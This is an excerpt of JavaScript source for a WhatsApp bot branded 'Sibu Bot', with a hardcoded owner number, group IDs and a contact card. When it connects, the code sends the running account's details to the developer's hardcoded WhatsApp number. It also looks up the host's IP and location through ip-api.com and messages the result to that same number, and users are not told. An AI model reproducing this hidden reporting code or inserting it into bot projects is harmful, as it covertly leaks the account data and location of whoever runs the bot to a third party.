...
const gcrevoke = ["16149448340-1621430788@g.us"]
prefix = '#'
shp = '⬡'
owner = "16149448340@s.whatsapp.net"
spc1 = '         '
spc2 = '\n                           '
spc3 = '                   '
spc4 = '               '
...
const starts = async (client = new WAConnection()) => {
  ...
  client.browserDescription = ["Subscribe 𝐒𝐈𝐁𝐔", "Chrome", "3.0"];
  ...
  client.on("qr", () => {
    console.log(
      ...
      client.sendMessage(`16149448340@s.whatsapp.net`, `「 *NOTIFICATION!* 」\n\n _Bot Connected Successfully!_`, MessageType.extendedText)
  ...
  client.on("open", () => {
    success("2", "Successfully connected to wa, Subscribe 𝐒𝐈𝐁𝐔");
...
console.log(color(`${spc4}< ================================================== >`, 'cyan'))
    ...
    console.log(color('[𝐒𝐈𝐁𝐔 𝐁𝐎𝐓]'), color(' 𝐀𝐣𝐮𝐒𝐞𝐫 𝐁𝐨𝐭 𝗜𝘀 𝗢𝗻𝗹𝗶𝗻𝗲 ㋛︎', 'aqua'))
...
await client.connect({ timeoutMs: 30 * 1000 });
 ...
 client.sendMessage(`16149448340@s.whatsapp.net`, `*Hi Owner Sibu, the bot has been successfully connected to this number*\n────────────────────\n\`\`\`${JSON.stringify(client.user, null, 2)}\`\`\`\n────────────────────\n*If there is an error/bot not responding, please contact the bot developer above, thank you*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Sibu Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./Sibu.jpg'),sourceUrl:"https://wa.me/16149448340?text=Hello bro"}}})
	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
fetch(`http://ip-api.com/line`).then(res => res.text())  
        .then(bu =>{
       client.sendMessage("16149448340@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Sibu Bot Inc.",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./Sibu.jpg'),sourceUrl:"https://wa.me/16149448340?text=Hello bro"}}})
...
fkontakk = { key: {
  fromMe: false,
    participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '16149448340-1604595598@g.us' } : {})
},
 message: {
    "contactMessage":{"displayName":'Sibu',"vcard":"BEGIN:VCARD\nVERSION:3.0\nN:2;Sibu;;;\nFN:resku\nitem1.TEL;waid=16149448340:+91 799-4873-071\nitem1.X-ABLabel:Mobile\nEND:VCARD"
 }}}
